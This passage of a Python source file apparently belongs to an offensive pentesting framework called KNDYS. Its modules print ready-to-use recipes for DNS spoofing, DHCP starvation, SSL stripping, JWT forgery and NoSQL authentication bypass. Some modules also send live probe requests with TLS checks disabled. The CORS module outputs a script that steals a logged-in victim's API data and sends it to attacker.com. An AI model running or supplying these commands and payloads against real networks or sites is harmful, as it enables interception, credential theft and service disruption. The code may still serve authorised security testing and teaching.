        fake_ip = self.module_options.get('fake_ip', '192.168.1.100')
        interface = self.module_options.get('interface', 'eth0')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║          DNS SPOOFING ATTACK                     ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Domain: {Fore.WHITE}{domain}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Fake IP: {Fore.WHITE}{fake_ip}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}Tool options:{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}1. Using dnsspoof (dsniff):{Style.RESET_ALL}")
        print(f"   {Fore.CYAN}echo '{domain} {fake_ip}' > dns.txt")
        print(f"   sudo dnsspoof -i {interface} -f dns.txt{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}2. Using Bettercap:{Style.RESET_ALL}")
        print(f"   {Fore.CYAN}sudo bettercap -iface {interface}")
        print(f"   > set dns.spoof.domains {domain}")
        print(f"   > set dns.spoof.address {fake_ip}")
        print(f"   > dns.spoof on{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}3. Using Scapy:{Style.RESET_ALL}")
        print(f"   {Fore.CYAN}# Sniff DNS queries and respond with fake IP{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}⚠  Requires active MITM (ARP spoofing first){Style.RESET_ALL}")
        print(f"{Fore.BLUE}ℹ  Common targets: login.microsoft.com, accounts.google.com{Style.RESET_ALL}")
    
    def run_dhcp_starvation(self):
        """DHCP starvation attack"""
        interface = self.module_options.get('interface', 'eth0')
        count = int(self.module_options.get('count', '100'))
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║          DHCP STARVATION ATTACK                  ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Requests: {Fore.WHITE}{count}{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}Tool: Yersinia{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}sudo yersinia -G  # GUI mode")
        print(f"  # Select DHCP, enable 'Sending DISCOVER packet'{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}Tool: DHCPig{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}sudo pig.py {interface}{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}ℹ  Impact:{Style.RESET_ALL}")
        print(f"  • Legitimate clients can't get IP addresses")
        print(f"  • Prepares for rogue DHCP server")
        print(f"  • Network-wide disruption{Style.RESET_ALL}")
    
    def run_ssl_strip(self):
        """SSL stripping attack"""
        interface = self.module_options.get('interface', 'eth0')
        port = self.module_options.get('port', '8080')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║          SSL STRIP ATTACK                        ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Port: {Fore.WHITE}{port}{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}⚠  Prerequisites:{Style.RESET_ALL}")
        print(f"  1. Active MITM (ARP spoofing)")
        print(f"  2. IP forwarding enabled")
        print(f"  3. iptables redirect setup\n")
        
        print(f"{Fore.BLUE}Setup steps:{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}# 1. Enable IP forwarding")
        print(f"echo 1 > /proc/sys/net/ipv4/ip_forward")
        print(f"")
        print(f"# 2. Redirect traffic to sslstrip")
        print(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {port}")
        print(f"")
        print(f"# 3. Run sslstrip")
        print(f"sslstrip -l {port} -w sslstrip.log")
        print(f"")
        print(f"# 4. Start ARP spoofing")
        print(f"# use network/arp_spoof{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}ℹ  What it does:{Style.RESET_ALL}")
        print(f"  • Intercepts HTTPS requests")
        print(f"  • Serves HTTP version to victim")
        print(f"  • Victim sees HTTP, you see credentials")
        print(f"  • Defeats basic SSL{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Note: Modern browsers have HSTS protection{Style.RESET_ALL}")
    
    def run_packet_sniffer(self):
        """Advanced packet sniffer"""
        interface = self.module_options.get('interface', 'eth0')
        filter_str = self.module_options.get('filter', 'tcp port 80')
        output = self.module_options.get('output', 'capture.pcap')
        count = int(self.module_options.get('count', '100'))
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║          PACKET SNIFFER                          ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Filter: {Fore.WHITE}{filter_str}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Output: {Fore.WHITE}{output}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Count: {Fore.WHITE}{count} packets{Style.RESET_ALL}\n")
        
        if not SCAPY_AVAILABLE:
            print(f"{Fore.RED}✗ Scapy not available{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}Common BPF filters:{Style.RESET_ALL}\n")
        
        filters = [
            ("tcp port 80", "HTTP traffic"),
            ("tcp port 443", "HTTPS traffic"),
            ("tcp port 21 or tcp port 22", "FTP/SSH"),
            ("udp port 53", "DNS queries"),
            ("tcp[tcpflags] & (tcp-syn) != 0", "SYN packets only"),
            ("host 192.168.1.100", "Specific host"),
            ("net 192.168.1.0/24", "Entire network"),
            ("port 80 and host 192.168.1.100", "Combined")
        ]
        
        for f, desc in filters:
            print(f"  {Fore.GREEN}{f:<40}{Fore.WHITE}{desc}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}Using tcpdump:{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}sudo tcpdump -i {interface} -w {output} '{filter_str}' -c {count}{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}Using tshark:{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}tshark -i {interface} -w {output} -f '{filter_str}' -c {count}{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}ℹ  Analysis tools:{Style.RESET_ALL}")
        print(f"  • Wireshark - GUI analysis")
        print(f"  • tshark - CLI analysis")
        print(f"  • NetworkMiner - Extract files/credentials")
        print(f"  • Bro/Zeek - Network security monitoring{Style.RESET_ALL}")
    
    # ============ WEB APPLICATION MODULES ============
    
    def run_jwt_cracker(self):
        """JWT security tester"""
        token = self.module_options.get('token', '')
        wordlist = self.module_options.get('wordlist', 'secrets.txt')
        algorithm = self.module_options.get('algorithm', 'HS256')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║          JWT SECURITY TESTER                     ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        if not token:
            print(f"{Fore.YELLOW}No token provided. Showing test scenarios:{Style.RESET_ALL}\n")
            
            print(f"{Fore.GREEN}1. None Algorithm Attack:{Style.RESET_ALL}")
            print(f"   Change 'alg' to 'none' and remove signature")
            print(f"   {Fore.CYAN}{{\"alg\":\"none\",\"typ\":\"JWT\"}}{Style.RESET_ALL}\n")
            
            print(f"{Fore.GREEN}2. Algorithm Confusion (RS256 → HS256):{Style.RESET_ALL}")
            print(f"   Sign with public key using HS256")
            print(f"   Server may verify with public key as secret\n")
            
            print(f"{Fore.GREEN}3. Weak Secret Brute Force:{Style.RESET_ALL}")
            print(f"   Try common secrets from wordlist\n")
            
            print(f"{Fore.GREEN}4. JWT Payload Manipulation:{Style.RESET_ALL}")
            print(f"   Modify claims: user_id, role, permissions\n")
            
            print(f"{Fore.BLUE}Example token structure:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.{Style.RESET_ALL}")
            print(f"{Fore.GREEN}SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c{Style.RESET_ALL}\n")
            
            print(f"{Fore.BLUE}Tools:{Style.RESET_ALL}")
            print(f"  • jwt_tool - https://github.com/ticarpi/jwt_tool")
            print(f"  • jwt.io - Online decoder")
            print(f"  • hashcat - JWT cracking")
        else:
            print(f"{Fore.YELLOW}Token: {Fore.WHITE}{token[:50]}...{Style.RESET_ALL}\n")
            
            # Simple JWT decode demonstration
            try:
                parts = token.split('.')
                if len(parts) == 3:
                    import base64
                    
                    header = base64.b64decode(parts[0] + '==').decode('utf-8')
                    payload = base64.b64decode(parts[1] + '==').decode('utf-8')
                    
                    print(f"{Fore.GREEN}✓ JWT decoded:{Style.RESET_ALL}\n")
                    print(f"{Fore.CYAN}Header:{Style.RESET_ALL}")
                    print(f"{header}\n")
                    print(f"{Fore.CYAN}Payload:{Style.RESET_ALL}")
                    print(f"{payload}\n")
            except:
                print(f"{Fore.RED}✗ Invalid JWT format{Style.RESET_ALL}\n")
    
    def run_api_fuzzer(self):
        """REST API fuzzer"""
        url = self.module_options.get('url', 'https://api.example.com')
        method = self.module_options.get('method', 'POST')
        endpoints_file = self.module_options.get('endpoints', 'endpoints.txt')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║          REST API FUZZER                         ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Target: {Fore.WHITE}{url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Method: {Fore.WHITE}{method}{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}Common API endpoints to test:{Style.RESET_ALL}\n")
        
        endpoints = [
            "/api/v1/users",
            "/api/v1/login",
            "/api/v1/register",
            "/api/v1/admin",
            "/api/v1/config",
            "/api/v1/export",
            "/api/v1/upload",
            "/api/internal",
            "/api/debug",
            "/api/test",
            "/.env",
            "/api/swagger.json",
            "/api/graphql"
        ]
        
        for endpoint in endpoints:
            print(f"  {Fore.CYAN}{endpoint}{Style.RESET_ALL}")
        
        print(f"\n{Fore.BLUE}Fuzzing techniques:{Style.RESET_ALL}")
        print(f"  • HTTP method fuzzing (GET, POST, PUT, DELETE, PATCH, OPTIONS)")
        print(f"  • Path traversal (../../../etc/passwd)")
        print(f"  • SQL injection in parameters")
        print(f"  • XXE in XML/JSON")
        print(f"  • Authentication bypass")
        print(f"  • Rate limiting tests")
        print(f"  • IDOR vulnerabilities\n")
        
        print(f"{Fore.GREEN}ℹ  Tools:{Style.RESET_ALL}")
        print(f"  • ffuf - Fast web fuzzer")
        print(f"  • wfuzz - Web application fuzzer")
        print(f"  • Burp Suite Intruder")
        print(f"  • OWASP ZAP")
    
    def run_cors_scanner(self):
        """CORS misconfiguration scanner"""
        url = self.module_options.get('url', 'https://example.com')
        origin = self.module_options.get('origin', 'https://evil.com')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║          CORS SCANNER                            ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Target: {Fore.WHITE}{url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Origin: {Fore.WHITE}{origin}{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}Testing CORS configuration...{Style.RESET_ALL}\n")
        
        try:
            headers = {
                'Origin': origin,
                'User-Agent': self.config['user_agent']
            }
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            acao = response.headers.get('Access-Control-Allow-Origin')
            acac = response.headers.get('Access-Control-Allow-Credentials')
            
            if acao:
                print(f"{Fore.GREEN}✓ CORS headers present{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Access-Control-Allow-Origin: {Fore.WHITE}{acao}{Style.RESET_ALL}")
                if acac:
                    print(f"{Fore.CYAN}Access-Control-Allow-Credentials: {Fore.WHITE}{acac}{Style.RESET_ALL}\n")
                
                if acao == '*':
                    print(f"{Fore.YELLOW}⚠  Wildcard CORS - allows all origins!{Style.RESET_ALL}")
                elif acao == origin:
                    print(f"{Fore.RED}⚠  Origin reflected - potential vulnerability!{Style.RESET_ALL}")
                    if acac == 'true':
                        print(f"{Fore.RED}⚠  Credentials allowed with reflected origin - CRITICAL!{Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}✓ CORS properly configured{Style.RESET_ALL}")
            else:
                print(f"{Fore.BLUE}ℹ  No CORS headers found{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED}✗ Error: {str(e)}{Style.RESET_ALL}")
        
        print(f"\n{Fore.BLUE}Exploitation scenario:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}<!-- evil.com -->")
        print(f"<script>")
        print(f"fetch('{url}/api/sensitive', {{")
        print(f"  credentials: 'include'")
        print(f"}}).then(r => r.json())")
        print(f"  .then(data => fetch('https://attacker.com/steal?data=' + JSON.stringify(data)))")
        print(f"</script>{Style.RESET_ALL}")
    
    def run_nosql_injection(self):
        """NoSQL injection tester"""
        url = self.module_options.get('url', 'http://example.com/api')
        parameter = self.module_options.get('parameter', 'username')
        technique = self.module_options.get('technique', 'auth_bypass')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║          NoSQL INJECTION TESTER                  ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Target: {Fore.WHITE}{url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Parameter: {Fore.WHITE}{parameter}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Technique: {Fore.WHITE}{technique}{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}Common NoSQL injection payloads:{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}1. Authentication Bypass (MongoDB):{Style.RESET_ALL}")
        print(f"   {Fore.WHITE}username[$ne]=null&password[$ne]=null")
        print(f"   username[$gt]=&password[$gt]=")
        print(f"   username=admin&password[$ne]=1{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}2. JavaScript Injection:{Style.RESET_ALL}")
        print(f"   {Fore.WHITE}username=admin&password=x' || '1'=='1")
        print(f"   username='; return true; var dummy='&password=pass{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}3. Blind NoSQL Injection:{Style.RESET_ALL}")
        print(f"   {Fore.WHITE}username[$regex]=^a.*&password[$ne]=1")
        print(f"   # Test each character of password{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}4. Array Injection:{Style.RESET_ALL}")
        print(f"   {Fore.WHITE}username[]=admin&username[]=administrator")
        print(f"   # May bypass length validation{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}MongoDB operators to test:{Style.RESET_ALL}")
        ops = ["$ne", "$gt", "$gte", "$lt", "$lte", "$in", "$nin", "$regex", "$where", "$exists"]
        print(f"   {', '.join(ops)}\n")
        
        print(f"{Fore.GREEN}ℹ  Tools:{Style.RESET_ALL}")
        print(f"  • NoSQLMap - Automated NoSQL scanner")
        print(f"  • Burp Suite + NoSQLi extensions")
        print(f"  • Manual testing with Burp Repeater")
    
    def run_graphql_introspection(self):
        """GraphQL schema introspection"""
        url = self.module_options.get('url', 'https://api.example.com/graphql')
        output = self.module_options.get('output', 'schema.json')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║          GraphQL INTROSPECTION                   ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Endpoint: {Fore.WHITE}{url}{Style.RESET_ALL}\n")
        
        introspection_query = """{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
    queryType {
      name
    }
    mutationType {
      name
    }
  }
}"""
        
        print(f"{Fore.CYAN}Introspection query:{Style.RESET_ALL}\n{Fore.WHITE}{introspection_query}{Style.RESET_ALL}\n")
        
        try:
            response = requests.post(
                url,
                json={'query': introspection_query},
                headers={'Content-Type': 'application/json'},
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                data = response.json()
                
                with open(output, 'w') as f:
                    json.dump(data, f, indent=2)
                
                print(f"{Fore.GREEN}✓ Schema retrieved!{Style.RESET_ALL}")
                print(f"{Fore.CYAN}→ Saved to: {Fore.WHITE}{output}{Style.RESET_ALL}\n")
                
                if 'data' in data and '__schema' in data['data']:
                    types = data['data']['__schema']['types']
                    print(f"{Fore.BLUE}Found {len(types)} types{Style.RESET_ALL}\n")
                    
                    print(f"{Fore.GREEN}Sample types:{Style.RESET_ALL}")
                    for t in types[:5]:
                        print(f"  • {Fore.CYAN}{t['name']}{Style.RESET_ALL}")
                        
            else:
                print(f"{Fore.RED}✗ Introspection may be disabled{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Status: {response.status_code}{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED}✗ Error: {str(e)}{Style.RESET_ALL}")
        
        print(f"\n{Fore.BLUE}Common GraphQL attacks:{Style.RESET_ALL}")
        print(f"  • Introspection (schema disclosure)")
        print(f"  • Nested queries (DoS)")
        print(f"  • Batch attacks")
        print(f"  • Field suggestion abuse")
        print(f"  • Authorization bypass")
        print(f"\n{Fore.GREEN}ℹ  Tools:{Style.RESET_ALL}")
        print(f"  • GraphQL Voyager - Visualize schema")
        print(f"  • Altair - GraphQL client")
        print(f"  • InQL Scanner - Burp extension")
    
    def run_evidence_collector(self):
        """Collect evidence and screenshots"""
        session_id = self.module_options.get('session', '1')
        output = self.module_options.get('output', 'evidence.zip')
        
        print(f"{Fore.CYAN}[*] Collecting evidence from session {session_id}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Output: {output}{Style.RESET_ALL}\n")
        
        evidence_dir = f"evidence_{int(time.time())}"
        os.makedirs(evidence_dir, exist_ok=True)
        
        print(f"{Fore.BLUE}[*] Collecting system information...{Style.RESET_ALL}")
        
        # Collect system info
        sysinfo = {
            'hostname': platform.node(),
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'timestamp': datetime.now().isoformat()
        }
        
        with open(os.path.join(evidence_dir, 'sysinfo.json'), 'w') as f:
            json.dump(sysinfo, f, indent=2)
        
        print(f"{Fore.GREEN}[+] System information collected{Style.RESET_ALL}")
        
        # Collect network information
        print(f"{Fore.BLUE}[*] Collecting network information...{Style.RESET_ALL}")
        try:
            result = subprocess.run('ifconfig || ip addr', shell=True, capture_output=True, text=True)
            with open(os.path.join(evidence_dir, 'network.txt'), 'w') as f:
                f.write(result.stdout)
            print(f"{Fore.GREEN}[+] Network information collected{Style.RESET_ALL}")
        except:
            pass
        
        # Create zip archive
        print(f"{Fore.BLUE}[*] Creating archive...{Style.RESET_ALL}")
        try:
            with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(evidence_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, evidence_dir)
                        zipf.write(file_path, arcname)
            
            print(f"{Fore.GREEN}[+] Evidence archived: {output}{Style.RESET_ALL}")
            
            # Cleanup
            import shutil
            shutil.rmtree(evidence_dir)
        except Exception as e:
            print(f"{Fore.RED}[!] Error creating archive: {str(e)}{Style.RESET_ALL}")
    
    def show_stats(self):
        """Show framework statistics"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════╗")
        print(f"║          FRAMEWORK STATISTICS                    ║")
        print(f"╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        # Connection statistics
        print(f"{Fore.YELLOW}┌─[ Connection Pool ]───────────────────────{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ Active connections: {Fore.CYAN}{self.connection_pool.get_active_count()}/{self.connection_pool.max_connections}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}└───────────────────────────────────────────{Style.RESET_ALL}\n")
        
        # Rate limiter statistics
        print(f"{Fore.YELLOW}┌─[ Rate Limiter ]─────────────────────────{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ Max requests: {Fore.CYAN}{self.rate_limiter.max_requests} per {self.rate_limiter.time_window}s{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ Current requests: {Fore.CYAN}{len(self.rate_limiter.requests)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}└───────────────────────────────────────────{Style.RESET_ALL}\n")
        
        # Session statistics
        print(f"{Fore.YELLOW}┌─[ Sessions ]─────────────────────────────{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ Active sessions: {Fore.CYAN}{len(self.session_manager.sessions)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ Session timeout: {Fore.CYAN}{self.session_manager.session_timeout}s{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}└───────────────────────────────────────────{Style.RESET_ALL}\n")
        
        # Error statistics
        error_stats = self.error_handler.get_error_stats()
        if error_stats:
            print(f"{Fore.YELLOW}┌─[ Error Summary ]────────────────────────{Style.RESET_ALL}")
            for error_type, count in sorted(error_stats.items(), key=lambda x: x[1], reverse=True):
                print(f"{Fore.WHITE}│ {error_type:30} {Fore.RED}{count}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}└───────────────────────────────────────────{Style.RESET_ALL}\n")
        
        # Module statistics
        print(f"{Fore.YELLOW}┌─[ Module Information ]───────────────────{Style.RESET_ALL}")
        total_modules = sum(len(mods) for mods in self.modules.values())
        print(f"{Fore.WHITE}│ Total modules: {Fore.CYAN}{total_modules}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ Categories: {Fore.CYAN}{len(self.modules)}{Style.RESET_ALL}")
        if self.current_module:
            print(f"{Fore.WHITE}│ Current module: {Fore.GREEN}{self.current_module}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}└───────────────────────────────────────────{Style.RESET_ALL}\n")
    
    def show_sessions(self):
        """Show active sessions"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════╗")
        print(f"║          ACTIVE SESSIONS                         ║")
        print(f"╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        sessions = self.session_manager.sessions
        
        if not sessions:
            print(f"{Fore.YELLOW}[*] No active sessions{Style.RESET_ALL}\n")
            return
        
        print(f"{Fore.YELLOW}{'SESSION ID':<15} {'CREATED':<20} {'LAST ACTIVITY':<20} {'STATUS'}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'─'*75}{Style.RESET_ALL}")
        
        for session_id, session_data in sessions.items():
            created = datetime.fromtimestamp(session_data['created']).strftime('%Y-%m-%d %H:%M:%S')
            last_activity = datetime.fromtimestamp(session_data['last_activity']).strftime('%Y-%m-%d %H:%M:%S')
            
            # Calculate time since last activity
            idle_time = time.time() - session_data['last_activity']
            if idle_time < 60:
                status = f"{Fore.GREEN}Active{Style.RESET_ALL}"
            elif idle_time < 300:
                status = f"{Fore.YELLOW}Idle ({int(idle_time/60)}m){Style.RESET_ALL}"
            else:
                status = f"{Fore.RED}Stale ({int(idle_time/60)}m){Style.RESET_ALL}"
            
            print(f"{session_id:<15} {created:<20} {last_activity:<20} {status}")
        
        print()
    
    def run(self):
        """Main framework loop"""
        self.display_banner()
        
        while True:
            try:
                # Build prompt
                if self.current_module:
                    module_short = self.current_module.split('/')[-1]
                    prompt = f"{Fore.CYAN}┌─[{Fore.RED}kndys{Fore.CYAN}]─[{Fore.YELLOW}{module_short}{Fore.CYAN}]\n└─{Fore.RED}►{Style.RESET_ALL} "
                else:
                    prompt = f"{Fore.CYAN}┌─[{Fore.RED}kndys{Fore.CYAN}]\n└─{Fore.RED}►{Style.RESET_ALL} "
                
                try:
                    cmd = input(prompt).strip()
                except EOFError:
                    print()
                    break
                
                if not cmd:
                    continue
                
                parts = cmd.split()
                command = parts[0].lower()
                args = parts[1:]
                
                if command in ['exit', 'quit']:
                    print(f"\n{Fore.CYAN}{'═'*50}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}Thank you for using KNDYS Framework{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}{'═'*50}{Style.RESET_ALL}\n")
                    break
                
                elif command == 'help':
                    self.show_help()
                
                elif command == 'show':
                    if args and args[0] == 'modules':
                        category = args[1] if len(args) > 1 else None
                        self.show_modules(category)
                    elif args and args[0] == 'payloads':
                        self.show_payloads()
                    elif args and args[0] == 'options':
                        self.show_options()
                    elif args and args[0] == 'wordlists':
                        self.show_wordlists()
                    else:
                        print(f"{Fore.RED}[!] Usage: show modules|payloads|options|wordlists{Style.RESET_ALL}")
                
                elif command == 'use':
                    if args:
                        self.use_module(args[0])
                    else:
                        print(f"{Fore.RED}[!] Usage: use <module_path>{Style.RESET_ALL}")
                
                elif command == 'set':
                    if len(args) >= 2:
                        self.set_option(args[0], ' '.join(args[1:]))
                    else:
                        print(f"{Fore.RED}[!] Usage: set <option> <value>{Style.RESET_ALL}")
                
                elif command == 'setg':
                    if len(args) >= 2:
                        key = args[0]
                        value = ' '.join(args[1:])
                        if key in self.config:
                            self.config[key] = value
                            print(f"{Fore.GREEN}[+] Global {key} => {value}{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}[!] Invalid global option: {key}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}[!] Usage: setg <option> <value>{Style.RESET_ALL}")
                
                elif command == 'options':
                    self.show_options()
                
                elif command == 'run':
                    self.run_module()
                
                elif command == 'back':
                    self.current_module = None
                    self.module_options = {}
                    print(f"{Fore.YELLOW}[*] Back to main context{Style.RESET_ALL}")
                
                elif command == 'clear':
                    self.display_banner()
                
                elif command == 'search':
                    if args and args[0] == 'exploits':
                        query = ' '.join(args[1:]) if len(args) > 1 else ''
                        self.search_exploits(query)
                    else:
                        print(f"{Fore.RED}[!] Usage: search exploits <query>{Style.RESET_ALL}")
                
                elif command == 'generate':
                    if args and args[0] == 'payload':
                        self.generate_payload()
                    else:
                        print(f"{Fore.RED}[!] Usage: generate payload{Style.RESET_ALL}")

                elif command == 'download':
                    if len(args) >= 2 and args[0] == 'wordlist':
                        self.download_wordlist(args[1])
                    else:
                        print(f"{Fore.RED}[!] Usage: download wordlist <alias>{Style.RESET_ALL}")
                
                elif command == 'stats':
                    self.show_stats()
                
                elif command == 'sessions':
                    self.show_sessions()
                
                else:
                    print(f"{Fore.RED}✗ Unknown command: {Fore.WHITE}{command}{Style.RESET_ALL}")
                    print(f"{Fore.BLUE}ℹ  Type {Fore.CYAN}help{Fore.BLUE} for available commands{Style.RESET_ALL}")
            
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Command interrupted{Style.RESET_ALL}")
                if self.running:
                    self.running = False
                    time.sleep(1)
            
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
                import traceback
                traceback.print_exc()

def main():
    """Main entry point"""
    print(f"{Fore.YELLOW}[*] Loading KNDYS Framework v3.0...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Checking dependencies...{Style.RESET_ALL}")
    
    # Check for required dependencies
    missing_deps = []
    
    if not NMAP_AVAILABLE:
        missing_deps.append("python-nmap (optional)")
    if not SCAPY_AVAILABLE:
        missing_deps.append("scapy (optional)")
    if not SSH_AVAILABLE:
        missing_deps.append("paramiko (optional)")
    if not BS4_AVAILABLE:
        missing_deps.append("beautifulsoup4 (optional)")
    
    if missing_deps:
        print(f"{Fore.YELLOW}[!] Missing optional dependencies: {', '.join(missing_deps)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Install with: pip install {' '.join([d.split()[0] for d in missing_deps])}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Continuing with reduced functionality...{Style.RESET_ALL}")
        time.sleep(2)
    
    try:
        framework = KNDYSFramework()
        framework.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Framework terminated{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {str(e)}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='KNDYS Pentesting Framework')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode')
    args = parser.parse_args()
    
    main()